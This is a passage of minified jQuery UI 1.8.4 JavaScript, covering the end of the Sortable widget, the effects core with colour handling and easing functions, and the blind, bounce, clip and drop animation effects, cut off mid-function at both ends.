_getDragHorizontalDirection:function(){var a=this.positionAbs.left-this.lastPositionAbs.left;return a!=0&&(a>0?"right":"left")},refresh:function(a){this._refreshItems(a);this.refreshPositions();return this},_connectWith:function(){var a=this.options;return a.connectWith.constructor==String?[a.connectWith]:a.connectWith},_getItemsAsjQuery:function(a){var b=[],c=[],e=this._connectWith();if(e&&a)for(a=e.length-1;a>=0;a--)for(var f=d(e[a]),g=f.length-1;g>=0;g--){var h=d.data(f[g],"sortable");if(h&&h!=
this&&!h.options.disabled)c.push([d.isFunction(h.options.items)?h.options.items.call(h.element):d(h.options.items,h.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),h])}c.push([d.isFunction(this.options.items)?this.options.items.call(this.element,null,{options:this.options,item:this.currentItem}):d(this.options.items,this.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),this]);for(a=c.length-1;a>=0;a--)c[a][0].each(function(){b.push(this)});return d(b)},_removeCurrentsFromItems:function(){for(var a=
this.currentItem.find(":data(sortable-item)"),b=0;b<this.items.length;b++)for(var c=0;c<a.length;c++)a[c]==this.items[b].item[0]&&this.items.splice(b,1)},_refreshItems:function(a){this.items=[];this.containers=[this];var b=this.items,c=[[d.isFunction(this.options.items)?this.options.items.call(this.element[0],a,{item:this.currentItem}):d(this.options.items,this.element),this]],e=this._connectWith();if(e)for(var f=e.length-1;f>=0;f--)for(var g=d(e[f]),h=g.length-1;h>=0;h--){var i=d.data(g[h],"sortable");
if(i&&i!=this&&!i.options.disabled){c.push([d.isFunction(i.options.items)?i.options.items.call(i.element[0],a,{item:this.currentItem}):d(i.options.items,i.element),i]);this.containers.push(i)}}for(f=c.length-1;f>=0;f--){a=c[f][1];e=c[f][0];h=0;for(g=e.length;h<g;h++){i=d(e[h]);i.data("sortable-item",a);b.push({item:i,instance:a,width:0,height:0,left:0,top:0})}}},refreshPositions:function(a){if(this.offsetParent&&this.helper)this.offset.parent=this._getParentOffset();for(var b=this.items.length-1;b>=
0;b--){var c=this.items[b],e=this.options.toleranceElement?d(this.options.toleranceElement,c.item):c.item;if(!a){c.width=e.outerWidth();c.height=e.outerHeight()}e=e.offset();c.left=e.left;c.top=e.top}if(this.options.custom&&this.options.custom.refreshContainers)this.options.custom.refreshContainers.call(this);else for(b=this.containers.length-1;b>=0;b--){e=this.containers[b].element.offset();this.containers[b].containerCache.left=e.left;this.containers[b].containerCache.top=e.top;this.containers[b].containerCache.width=
this.containers[b].element.outerWidth();this.containers[b].containerCache.height=this.containers[b].element.outerHeight()}return this},_createPlaceholder:function(a){var b=a||this,c=b.options;if(!c.placeholder||c.placeholder.constructor==String){var e=c.placeholder;c.placeholder={element:function(){var f=d(document.createElement(b.currentItem[0].nodeName)).addClass(e||b.currentItem[0].className+" ui-sortable-placeholder").removeClass("ui-sortable-helper")[0];if(!e)f.style.visibility="hidden";return f},
update:function(f,g){if(!(e&&!c.forcePlaceholderSize)){g.height()||g.height(b.currentItem.innerHeight()-parseInt(b.currentItem.css("paddingTop")||0,10)-parseInt(b.currentItem.css("paddingBottom")||0,10));g.width()||g.width(b.currentItem.innerWidth()-parseInt(b.currentItem.css("paddingLeft")||0,10)-parseInt(b.currentItem.css("paddingRight")||0,10))}}}}b.placeholder=d(c.placeholder.element.call(b.element,b.currentItem));b.currentItem.after(b.placeholder);c.placeholder.update(b,b.placeholder)},_contactContainers:function(a){for(var b=
null,c=null,e=this.containers.length-1;e>=0;e--)if(!d.ui.contains(this.currentItem[0],this.containers[e].element[0]))if(this._intersectsWith(this.containers[e].containerCache)){if(!(b&&d.ui.contains(this.containers[e].element[0],b.element[0]))){b=this.containers[e];c=e}}else if(this.containers[e].containerCache.over){this.containers[e]._trigger("out",a,this._uiHash(this));this.containers[e].containerCache.over=0}if(b)if(this.containers.length===1){this.containers[c]._trigger("over",a,this._uiHash(this));
this.containers[c].containerCache.over=1}else if(this.currentContainer!=this.containers[c]){b=1E4;e=null;for(var f=this.positionAbs[this.containers[c].floating?"left":"top"],g=this.items.length-1;g>=0;g--)if(d.ui.contains(this.containers[c].element[0],this.items[g].item[0])){var h=this.items[g][this.containers[c].floating?"left":"top"];if(Math.abs(h-f)<b){b=Math.abs(h-f);e=this.items[g]}}if(e||this.options.dropOnEmpty){this.currentContainer=this.containers[c];e?this._rearrange(a,e,null,true):this._rearrange(a,
null,this.containers[c].element,true);this._trigger("change",a,this._uiHash());this.containers[c]._trigger("change",a,this._uiHash(this));this.options.placeholder.update(this.currentContainer,this.placeholder);this.containers[c]._trigger("over",a,this._uiHash(this));this.containers[c].containerCache.over=1}}},_createHelper:function(a){var b=this.options;a=d.isFunction(b.helper)?d(b.helper.apply(this.element[0],[a,this.currentItem])):b.helper=="clone"?this.currentItem.clone():this.currentItem;a.parents("body").length||
d(b.appendTo!="parent"?b.appendTo:this.currentItem[0].parentNode)[0].appendChild(a[0]);if(a[0]==this.currentItem[0])this._storedCSS={width:this.currentItem[0].style.width,height:this.currentItem[0].style.height,position:this.currentItem.css("position"),top:this.currentItem.css("top"),left:this.currentItem.css("left")};if(a[0].style.width==""||b.forceHelperSize)a.width(this.currentItem.width());if(a[0].style.height==""||b.forceHelperSize)a.height(this.currentItem.height());return a},_adjustOffsetFromHelper:function(a){if(typeof a==
"string")a=a.split(" ");if(d.isArray(a))a={left:+a[0],top:+a[1]||0};if("left"in a)this.offset.click.left=a.left+this.margins.left;if("right"in a)this.offset.click.left=this.helperProportions.width-a.right+this.margins.left;if("top"in a)this.offset.click.top=a.top+this.margins.top;if("bottom"in a)this.offset.click.top=this.helperProportions.height-a.bottom+this.margins.top},_getParentOffset:function(){this.offsetParent=this.helper.offsetParent();var a=this.offsetParent.offset();if(this.cssPosition==
"absolute"&&this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0])){a.left+=this.scrollParent.scrollLeft();a.top+=this.scrollParent.scrollTop()}if(this.offsetParent[0]==document.body||this.offsetParent[0].tagName&&this.offsetParent[0].tagName.toLowerCase()=="html"&&d.browser.msie)a={top:0,left:0};return{top:a.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:a.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if(this.cssPosition==
"relative"){var a=this.currentItem.position();return{top:a.top-(parseInt(this.helper.css("top"),10)||0)+this.scrollParent.scrollTop(),left:a.left-(parseInt(this.helper.css("left"),10)||0)+this.scrollParent.scrollLeft()}}else return{top:0,left:0}},_cacheMargins:function(){this.margins={left:parseInt(this.currentItem.css("marginLeft"),10)||0,top:parseInt(this.currentItem.css("marginTop"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},
_setContainment:function(){var a=this.options;if(a.containment=="parent")a.containment=this.helper[0].parentNode;if(a.containment=="document"||a.containment=="window")this.containment=[0-this.offset.relative.left-this.offset.parent.left,0-this.offset.relative.top-this.offset.parent.top,d(a.containment=="document"?document:window).width()-this.helperProportions.width-this.margins.left,(d(a.containment=="document"?document:window).height()||document.body.parentNode.scrollHeight)-this.helperProportions.height-
this.margins.top];if(!/^(document|window|parent)$/.test(a.containment)){var b=d(a.containment)[0];a=d(a.containment).offset();var c=d(b).css("overflow")!="hidden";this.containment=[a.left+(parseInt(d(b).css("borderLeftWidth"),10)||0)+(parseInt(d(b).css("paddingLeft"),10)||0)-this.margins.left,a.top+(parseInt(d(b).css("borderTopWidth"),10)||0)+(parseInt(d(b).css("paddingTop"),10)||0)-this.margins.top,a.left+(c?Math.max(b.scrollWidth,b.offsetWidth):b.offsetWidth)-(parseInt(d(b).css("borderLeftWidth"),
10)||0)-(parseInt(d(b).css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left,a.top+(c?Math.max(b.scrollHeight,b.offsetHeight):b.offsetHeight)-(parseInt(d(b).css("borderTopWidth"),10)||0)-(parseInt(d(b).css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top]}},_convertPositionTo:function(a,b){if(!b)b=this.position;a=a=="absolute"?1:-1;var c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0]))?
this.offsetParent:this.scrollParent,e=/(html|body)/i.test(c[0].tagName);return{top:b.top+this.offset.relative.top*a+this.offset.parent.top*a-(d.browser.safari&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollTop():e?0:c.scrollTop())*a),left:b.left+this.offset.relative.left*a+this.offset.parent.left*a-(d.browser.safari&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():e?0:c.scrollLeft())*a)}},_generatePosition:function(a){var b=
this.options,c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0]))?this.offsetParent:this.scrollParent,e=/(html|body)/i.test(c[0].tagName);if(this.cssPosition=="relative"&&!(this.scrollParent[0]!=document&&this.scrollParent[0]!=this.offsetParent[0]))this.offset.relative=this._getRelativeOffset();var f=a.pageX,g=a.pageY;if(this.originalPosition){if(this.containment){if(a.pageX-this.offset.click.left<this.containment[0])f=this.containment[0]+
this.offset.click.left;if(a.pageY-this.offset.click.top<this.containment[1])g=this.containment[1]+this.offset.click.top;if(a.pageX-this.offset.click.left>this.containment[2])f=this.containment[2]+this.offset.click.left;if(a.pageY-this.offset.click.top>this.containment[3])g=this.containment[3]+this.offset.click.top}if(b.grid){g=this.originalPageY+Math.round((g-this.originalPageY)/b.grid[1])*b.grid[1];g=this.containment?!(g-this.offset.click.top<this.containment[1]||g-this.offset.click.top>this.containment[3])?
g:!(g-this.offset.click.top<this.containment[1])?g-b.grid[1]:g+b.grid[1]:g;f=this.originalPageX+Math.round((f-this.originalPageX)/b.grid[0])*b.grid[0];f=this.containment?!(f-this.offset.click.left<this.containment[0]||f-this.offset.click.left>this.containment[2])?f:!(f-this.offset.click.left<this.containment[0])?f-b.grid[0]:f+b.grid[0]:f}}return{top:g-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+(d.browser.safari&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollTop():
e?0:c.scrollTop()),left:f-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+(d.browser.safari&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():e?0:c.scrollLeft())}},_rearrange:function(a,b,c,e){c?c[0].appendChild(this.placeholder[0]):b.item[0].parentNode.insertBefore(this.placeholder[0],this.direction=="down"?b.item[0]:b.item[0].nextSibling);this.counter=this.counter?++this.counter:1;var f=this,g=this.counter;window.setTimeout(function(){g==
f.counter&&f.refreshPositions(!e)},0)},_clear:function(a,b){this.reverting=false;var c=[];!this._noFinalSort&&this.currentItem[0].parentNode&&this.placeholder.before(this.currentItem);this._noFinalSort=null;if(this.helper[0]==this.currentItem[0]){for(var e in this._storedCSS)if(this._storedCSS[e]=="auto"||this._storedCSS[e]=="static")this._storedCSS[e]="";this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper")}else this.currentItem.show();this.fromOutside&&!b&&c.push(function(f){this._trigger("receive",
f,this._uiHash(this.fromOutside))});if((this.fromOutside||this.domPosition.prev!=this.currentItem.prev().not(".ui-sortable-helper")[0]||this.domPosition.parent!=this.currentItem.parent()[0])&&!b)c.push(function(f){this._trigger("update",f,this._uiHash())});if(!d.ui.contains(this.element[0],this.currentItem[0])){b||c.push(function(f){this._trigger("remove",f,this._uiHash())});for(e=this.containers.length-1;e>=0;e--)if(d.ui.contains(this.containers[e].element[0],this.currentItem[0])&&!b){c.push(function(f){return function(g){f._trigger("receive",
g,this._uiHash(this))}}.call(this,this.containers[e]));c.push(function(f){return function(g){f._trigger("update",g,this._uiHash(this))}}.call(this,this.containers[e]))}}for(e=this.containers.length-1;e>=0;e--){b||c.push(function(f){return function(g){f._trigger("deactivate",g,this._uiHash(this))}}.call(this,this.containers[e]));if(this.containers[e].containerCache.over){c.push(function(f){return function(g){f._trigger("out",g,this._uiHash(this))}}.call(this,this.containers[e]));this.containers[e].containerCache.over=
0}}this._storedCursor&&d("body").css("cursor",this._storedCursor);this._storedOpacity&&this.helper.css("opacity",this._storedOpacity);if(this._storedZIndex)this.helper.css("zIndex",this._storedZIndex=="auto"?"":this._storedZIndex);this.dragging=false;if(this.cancelHelperRemoval){if(!b){this._trigger("beforeStop",a,this._uiHash());for(e=0;e<c.length;e++)c[e].call(this,a);this._trigger("stop",a,this._uiHash())}return false}b||this._trigger("beforeStop",a,this._uiHash());this.placeholder[0].parentNode.removeChild(this.placeholder[0]);
this.helper[0]!=this.currentItem[0]&&this.helper.remove();this.helper=null;if(!b){for(e=0;e<c.length;e++)c[e].call(this,a);this._trigger("stop",a,this._uiHash())}this.fromOutside=false;return true},_trigger:function(){d.Widget.prototype._trigger.apply(this,arguments)===false&&this.cancel()},_uiHash:function(a){var b=a||this;return{helper:b.helper,placeholder:b.placeholder||d([]),position:b.position,originalPosition:b.originalPosition,offset:b.positionAbs,item:b.currentItem,sender:a?a.element:null}}});
d.extend(d.ui.sortable,{version:"1.8.4"})})(jQuery);
jQuery.effects||function(f,j){function l(c){var a;if(c&&c.constructor==Array&&c.length==3)return c;if(a=/rgb\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*\)/.exec(c))return[parseInt(a[1],10),parseInt(a[2],10),parseInt(a[3],10)];if(a=/rgb\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*\)/.exec(c))return[parseFloat(a[1])*2.55,parseFloat(a[2])*2.55,parseFloat(a[3])*2.55];if(a=/#([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/.exec(c))return[parseInt(a[1],
16),parseInt(a[2],16),parseInt(a[3],16)];if(a=/#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(c))return[parseInt(a[1]+a[1],16),parseInt(a[2]+a[2],16),parseInt(a[3]+a[3],16)];if(/rgba\(0, 0, 0, 0\)/.exec(c))return m.transparent;return m[f.trim(c).toLowerCase()]}function r(c,a){var b;do{b=f.curCSS(c,a);if(b!=""&&b!="transparent"||f.nodeName(c,"body"))break;a="backgroundColor"}while(c=c.parentNode);return l(b)}function n(){var c=document.defaultView?document.defaultView.getComputedStyle(this,null):this.currentStyle,
a={},b,d;if(c&&c.length&&c[0]&&c[c[0]])for(var e=c.length;e--;){b=c[e];if(typeof c[b]=="string"){d=b.replace(/\-(\w)/g,function(g,h){return h.toUpperCase()});a[d]=c[b]}}else for(b in c)if(typeof c[b]==="string")a[b]=c[b];return a}function o(c){var a,b;for(a in c){b=c[a];if(b==null||f.isFunction(b)||a in s||/scrollbar/.test(a)||!/color/i.test(a)&&isNaN(parseFloat(b)))delete c[a]}return c}function t(c,a){var b={_:0},d;for(d in a)if(c[d]!=a[d])b[d]=a[d];return b}function k(c,a,b,d){if(typeof c=="object"){d=
a;b=null;a=c;c=a.effect}if(f.isFunction(a)){d=a;b=null;a={}}if(typeof a=="number"||f.fx.speeds[a]){d=b;b=a;a={}}if(f.isFunction(b)){d=b;b=null}a=a||{};b=b||a.duration;b=f.fx.off?0:typeof b=="number"?b:f.fx.speeds[b]||f.fx.speeds._default;d=d||a.complete;return[c,a,b,d]}f.effects={};f.each(["backgroundColor","borderBottomColor","borderLeftColor","borderRightColor","borderTopColor","color","outlineColor"],function(c,a){f.fx.step[a]=function(b){if(!b.colorInit){b.start=r(b.elem,a);b.end=l(b.end);b.colorInit=
true}b.elem.style[a]="rgb("+Math.max(Math.min(parseInt(b.pos*(b.end[0]-b.start[0])+b.start[0],10),255),0)+","+Math.max(Math.min(parseInt(b.pos*(b.end[1]-b.start[1])+b.start[1],10),255),0)+","+Math.max(Math.min(parseInt(b.pos*(b.end[2]-b.start[2])+b.start[2],10),255),0)+")"}});var m={aqua:[0,255,255],azure:[240,255,255],beige:[245,245,220],black:[0,0,0],blue:[0,0,255],brown:[165,42,42],cyan:[0,255,255],darkblue:[0,0,139],darkcyan:[0,139,139],darkgrey:[169,169,169],darkgreen:[0,100,0],darkkhaki:[189,
183,107],darkmagenta:[139,0,139],darkolivegreen:[85,107,47],darkorange:[255,140,0],darkorchid:[153,50,204],darkred:[139,0,0],darksalmon:[233,150,122],darkviolet:[148,0,211],fuchsia:[255,0,255],gold:[255,215,0],green:[0,128,0],indigo:[75,0,130],khaki:[240,230,140],lightblue:[173,216,230],lightcyan:[224,255,255],lightgreen:[144,238,144],lightgrey:[211,211,211],lightpink:[255,182,193],lightyellow:[255,255,224],lime:[0,255,0],magenta:[255,0,255],maroon:[128,0,0],navy:[0,0,128],olive:[128,128,0],orange:[255,
165,0],pink:[255,192,203],purple:[128,0,128],violet:[128,0,128],red:[255,0,0],silver:[192,192,192],white:[255,255,255],yellow:[255,255,0],transparent:[255,255,255]},p=["add","remove","toggle"],s={border:1,borderBottom:1,borderColor:1,borderLeft:1,borderRight:1,borderTop:1,borderWidth:1,margin:1,padding:1};f.effects.animateClass=function(c,a,b,d){if(f.isFunction(b)){d=b;b=null}return this.each(function(){var e=f(this),g=e.attr("style")||" ",h=o(n.call(this)),q,u=e.attr("className");f.each(p,function(v,
i){c[i]&&e[i+"Class"](c[i])});q=o(n.call(this));e.attr("className",u);e.animate(t(h,q),a,b,function(){f.each(p,function(v,i){c[i]&&e[i+"Class"](c[i])});if(typeof e.attr("style")=="object"){e.attr("style").cssText="";e.attr("style").cssText=g}else e.attr("style",g);d&&d.apply(this,arguments)})})};f.fn.extend({_addClass:f.fn.addClass,addClass:function(c,a,b,d){return a?f.effects.animateClass.apply(this,[{add:c},a,b,d]):this._addClass(c)},_removeClass:f.fn.removeClass,removeClass:function(c,a,b,d){return a?
f.effects.animateClass.apply(this,[{remove:c},a,b,d]):this._removeClass(c)},_toggleClass:f.fn.toggleClass,toggleClass:function(c,a,b,d,e){return typeof a=="boolean"||a===j?b?f.effects.animateClass.apply(this,[a?{add:c}:{remove:c},b,d,e]):this._toggleClass(c,a):f.effects.animateClass.apply(this,[{toggle:c},a,b,d])},switchClass:function(c,a,b,d,e){return f.effects.animateClass.apply(this,[{add:a,remove:c},b,d,e])}});f.extend(f.effects,{version:"1.8.4",save:function(c,a){for(var b=0;b<a.length;b++)a[b]!==
null&&c.data("ec.storage."+a[b],c[0].style[a[b]])},restore:function(c,a){for(var b=0;b<a.length;b++)a[b]!==null&&c.css(a[b],c.data("ec.storage."+a[b]))},setMode:function(c,a){if(a=="toggle")a=c.is(":hidden")?"show":"hide";return a},getBaseline:function(c,a){var b;switch(c[0]){case "top":b=0;break;case "middle":b=0.5;break;case "bottom":b=1;break;default:b=c[0]/a.height}switch(c[1]){case "left":c=0;break;case "center":c=0.5;break;case "right":c=1;break;default:c=c[1]/a.width}return{x:c,y:b}},createWrapper:function(c){if(c.parent().is(".ui-effects-wrapper"))return c.parent();
var a={width:c.outerWidth(true),height:c.outerHeight(true),"float":c.css("float")},b=f("<div></div>").addClass("ui-effects-wrapper").css({fontSize:"100%",background:"transparent",border:"none",margin:0,padding:0});c.wrap(b);b=c.parent();if(c.css("position")=="static"){b.css({position:"relative"});c.css({position:"relative"})}else{f.extend(a,{position:c.css("position"),zIndex:c.css("z-index")});f.each(["top","left","bottom","right"],function(d,e){a[e]=c.css(e);if(isNaN(parseInt(a[e],10)))a[e]="auto"});
c.css({position:"relative",top:0,left:0})}return b.css(a).show()},removeWrapper:function(c){if(c.parent().is(".ui-effects-wrapper"))return c.parent().replaceWith(c);return c},setTransition:function(c,a,b,d){d=d||{};f.each(a,function(e,g){unit=c.cssUnit(g);if(unit[0]>0)d[g]=unit[0]*b+unit[1]});return d}});f.fn.extend({effect:function(c){var a=k.apply(this,arguments);a={options:a[1],duration:a[2],callback:a[3]};var b=f.effects[c];return b&&!f.fx.off?b.call(this,a):this},_show:f.fn.show,show:function(c){if(!c||
typeof c=="number"||f.fx.speeds[c])return this._show.apply(this,arguments);else{var a=k.apply(this,arguments);a[1].mode="show";return this.effect.apply(this,a)}},_hide:f.fn.hide,hide:function(c){if(!c||typeof c=="number"||f.fx.speeds[c])return this._hide.apply(this,arguments);else{var a=k.apply(this,arguments);a[1].mode="hide";return this.effect.apply(this,a)}},__toggle:f.fn.toggle,toggle:function(c){if(!c||typeof c=="number"||f.fx.speeds[c]||typeof c=="boolean"||f.isFunction(c))return this.__toggle.apply(this,
arguments);else{var a=k.apply(this,arguments);a[1].mode="toggle";return this.effect.apply(this,a)}},cssUnit:function(c){var a=this.css(c),b=[];f.each(["em","px","%","pt"],function(d,e){if(a.indexOf(e)>0)b=[parseFloat(a),e]});return b}});f.easing.jswing=f.easing.swing;f.extend(f.easing,{def:"easeOutQuad",swing:function(c,a,b,d,e){return f.easing[f.easing.def](c,a,b,d,e)},easeInQuad:function(c,a,b,d,e){return d*(a/=e)*a+b},easeOutQuad:function(c,a,b,d,e){return-d*(a/=e)*(a-2)+b},easeInOutQuad:function(c,
a,b,d,e){if((a/=e/2)<1)return d/2*a*a+b;return-d/2*(--a*(a-2)-1)+b},easeInCubic:function(c,a,b,d,e){return d*(a/=e)*a*a+b},easeOutCubic:function(c,a,b,d,e){return d*((a=a/e-1)*a*a+1)+b},easeInOutCubic:function(c,a,b,d,e){if((a/=e/2)<1)return d/2*a*a*a+b;return d/2*((a-=2)*a*a+2)+b},easeInQuart:function(c,a,b,d,e){return d*(a/=e)*a*a*a+b},easeOutQuart:function(c,a,b,d,e){return-d*((a=a/e-1)*a*a*a-1)+b},easeInOutQuart:function(c,a,b,d,e){if((a/=e/2)<1)return d/2*a*a*a*a+b;return-d/2*((a-=2)*a*a*a-2)+
b},easeInQuint:function(c,a,b,d,e){return d*(a/=e)*a*a*a*a+b},easeOutQuint:function(c,a,b,d,e){return d*((a=a/e-1)*a*a*a*a+1)+b},easeInOutQuint:function(c,a,b,d,e){if((a/=e/2)<1)return d/2*a*a*a*a*a+b;return d/2*((a-=2)*a*a*a*a+2)+b},easeInSine:function(c,a,b,d,e){return-d*Math.cos(a/e*(Math.PI/2))+d+b},easeOutSine:function(c,a,b,d,e){return d*Math.sin(a/e*(Math.PI/2))+b},easeInOutSine:function(c,a,b,d,e){return-d/2*(Math.cos(Math.PI*a/e)-1)+b},easeInExpo:function(c,a,b,d,e){return a==0?b:d*Math.pow(2,
10*(a/e-1))+b},easeOutExpo:function(c,a,b,d,e){return a==e?b+d:d*(-Math.pow(2,-10*a/e)+1)+b},easeInOutExpo:function(c,a,b,d,e){if(a==0)return b;if(a==e)return b+d;if((a/=e/2)<1)return d/2*Math.pow(2,10*(a-1))+b;return d/2*(-Math.pow(2,-10*--a)+2)+b},easeInCirc:function(c,a,b,d,e){return-d*(Math.sqrt(1-(a/=e)*a)-1)+b},easeOutCirc:function(c,a,b,d,e){return d*Math.sqrt(1-(a=a/e-1)*a)+b},easeInOutCirc:function(c,a,b,d,e){if((a/=e/2)<1)return-d/2*(Math.sqrt(1-a*a)-1)+b;return d/2*(Math.sqrt(1-(a-=2)*
a)+1)+b},easeInElastic:function(c,a,b,d,e){c=1.70158;var g=0,h=d;if(a==0)return b;if((a/=e)==1)return b+d;g||(g=e*0.3);if(h<Math.abs(d)){h=d;c=g/4}else c=g/(2*Math.PI)*Math.asin(d/h);return-(h*Math.pow(2,10*(a-=1))*Math.sin((a*e-c)*2*Math.PI/g))+b},easeOutElastic:function(c,a,b,d,e){c=1.70158;var g=0,h=d;if(a==0)return b;if((a/=e)==1)return b+d;g||(g=e*0.3);if(h<Math.abs(d)){h=d;c=g/4}else c=g/(2*Math.PI)*Math.asin(d/h);return h*Math.pow(2,-10*a)*Math.sin((a*e-c)*2*Math.PI/g)+d+b},easeInOutElastic:function(c,
a,b,d,e){c=1.70158;var g=0,h=d;if(a==0)return b;if((a/=e/2)==2)return b+d;g||(g=e*0.3*1.5);if(h<Math.abs(d)){h=d;c=g/4}else c=g/(2*Math.PI)*Math.asin(d/h);if(a<1)return-0.5*h*Math.pow(2,10*(a-=1))*Math.sin((a*e-c)*2*Math.PI/g)+b;return h*Math.pow(2,-10*(a-=1))*Math.sin((a*e-c)*2*Math.PI/g)*0.5+d+b},easeInBack:function(c,a,b,d,e,g){if(g==j)g=1.70158;return d*(a/=e)*a*((g+1)*a-g)+b},easeOutBack:function(c,a,b,d,e,g){if(g==j)g=1.70158;return d*((a=a/e-1)*a*((g+1)*a+g)+1)+b},easeInOutBack:function(c,
a,b,d,e,g){if(g==j)g=1.70158;if((a/=e/2)<1)return d/2*a*a*(((g*=1.525)+1)*a-g)+b;return d/2*((a-=2)*a*(((g*=1.525)+1)*a+g)+2)+b},easeInBounce:function(c,a,b,d,e){return d-f.easing.easeOutBounce(c,e-a,0,d,e)+b},easeOutBounce:function(c,a,b,d,e){return(a/=e)<1/2.75?d*7.5625*a*a+b:a<2/2.75?d*(7.5625*(a-=1.5/2.75)*a+0.75)+b:a<2.5/2.75?d*(7.5625*(a-=2.25/2.75)*a+0.9375)+b:d*(7.5625*(a-=2.625/2.75)*a+0.984375)+b},easeInOutBounce:function(c,a,b,d,e){if(a<e/2)return f.easing.easeInBounce(c,a*2,0,d,e)*0.5+
b;return f.easing.easeOutBounce(c,a*2-e,0,d,e)*0.5+d*0.5+b}})}(jQuery);
(function(b){b.effects.blind=function(c){return this.queue(function(){var a=b(this),g=["position","top","left"],f=b.effects.setMode(a,c.options.mode||"hide"),d=c.options.direction||"vertical";b.effects.save(a,g);a.show();var e=b.effects.createWrapper(a).css({overflow:"hidden"}),h=d=="vertical"?"height":"width";d=d=="vertical"?e.height():e.width();f=="show"&&e.css(h,0);var i={};i[h]=f=="show"?d:0;e.animate(i,c.duration,c.options.easing,function(){f=="hide"&&a.hide();b.effects.restore(a,g);b.effects.removeWrapper(a);
c.callback&&c.callback.apply(a[0],arguments);a.dequeue()})})}})(jQuery);
(function(e){e.effects.bounce=function(b){return this.queue(function(){var a=e(this),l=["position","top","left"],h=e.effects.setMode(a,b.options.mode||"effect"),d=b.options.direction||"up",c=b.options.distance||20,m=b.options.times||5,i=b.duration||250;/show|hide/.test(h)&&l.push("opacity");e.effects.save(a,l);a.show();e.effects.createWrapper(a);var f=d=="up"||d=="down"?"top":"left";d=d=="up"||d=="left"?"pos":"neg";c=b.options.distance||(f=="top"?a.outerHeight({margin:true})/3:a.outerWidth({margin:true})/
3);if(h=="show")a.css("opacity",0).css(f,d=="pos"?-c:c);if(h=="hide")c/=m*2;h!="hide"&&m--;if(h=="show"){var g={opacity:1};g[f]=(d=="pos"?"+=":"-=")+c;a.animate(g,i/2,b.options.easing);c/=2;m--}for(g=0;g<m;g++){var j={},k={};j[f]=(d=="pos"?"-=":"+=")+c;k[f]=(d=="pos"?"+=":"-=")+c;a.animate(j,i/2,b.options.easing).animate(k,i/2,b.options.easing);c=h=="hide"?c*2:c/2}if(h=="hide"){g={opacity:0};g[f]=(d=="pos"?"-=":"+=")+c;a.animate(g,i/2,b.options.easing,function(){a.hide();e.effects.restore(a,l);e.effects.removeWrapper(a);
b.callback&&b.callback.apply(this,arguments)})}else{j={};k={};j[f]=(d=="pos"?"-=":"+=")+c;k[f]=(d=="pos"?"+=":"-=")+c;a.animate(j,i/2,b.options.easing).animate(k,i/2,b.options.easing,function(){e.effects.restore(a,l);e.effects.removeWrapper(a);b.callback&&b.callback.apply(this,arguments)})}a.queue("fx",function(){a.dequeue()});a.dequeue()})}})(jQuery);
(function(b){b.effects.clip=function(e){return this.queue(function(){var a=b(this),i=["position","top","left","height","width"],f=b.effects.setMode(a,e.options.mode||"hide"),c=e.options.direction||"vertical";b.effects.save(a,i);a.show();var d=b.effects.createWrapper(a).css({overflow:"hidden"});d=a[0].tagName=="IMG"?d:a;var g={size:c=="vertical"?"height":"width",position:c=="vertical"?"top":"left"};c=c=="vertical"?d.height():d.width();if(f=="show"){d.css(g.size,0);d.css(g.position,c/2)}var h={};h[g.size]=
f=="show"?c:0;h[g.position]=f=="show"?0:c/2;d.animate(h,{queue:false,duration:e.duration,easing:e.options.easing,complete:function(){f=="hide"&&a.hide();b.effects.restore(a,i);b.effects.removeWrapper(a);e.callback&&e.callback.apply(a[0],arguments);a.dequeue()}})})}})(jQuery);
(function(c){c.effects.drop=function(d){return this.queue(function(){var a=c(this),h=["position","top","left","opacity"],e=c.effects.setMode(a,d.options.mode||"hide"),b=d.options.direction||"left";c.effects.save(a,h);a.show();c.effects.createWrapper(a);var f=b=="up"||b=="down"?"top":"left";b=b=="up"||b=="left"?"pos":"neg";var g=d.options.distance||(f=="top"?a.outerHeight({margin:true})/2:a.outerWidth({margin:true})/2);if(e=="show")a.css("opacity",0).css(f,b=="pos"?-g:g);var i={opacity:e=="show"?1:
0};i[f]=(e=="show"?b=="pos"?"+=":"-=":b=="pos"?"-=":"+=")+g;a.animate(i,{queue:false,duration:d.duration,easing:d.options.easing,complete:function(){e=="hide"&&a.hide();c.effects.restore(a,h);c.effects.removeWrapper(a);d.callback&&d.callback.apply(this,arguments);a.dequeue()}})})}})(jQuery);
(function(j){j.effects.explode=function(a){return this.queue(function(){var c=a.options.pieces?Math.round(Math.sqrt(a.options.pieces)):3,d=a.options.pieces?Math.round(Math.sqrt(a.options.pieces)):3;a.options.mode=a.options.mode=="toggle"?j(this).is(":visible")?"hide":"show":a.options.mode;var b=j(this).show().css("visibility","hidden"),g=b.offset();g.top-=parseInt(b.css("marginTop"),10)||0;g.left-=parseInt(b.css("marginLeft"),10)||0;for(var h=b.outerWidth(true),i=b.outerHeight(true),e=0;e<c;e++)for(var f=
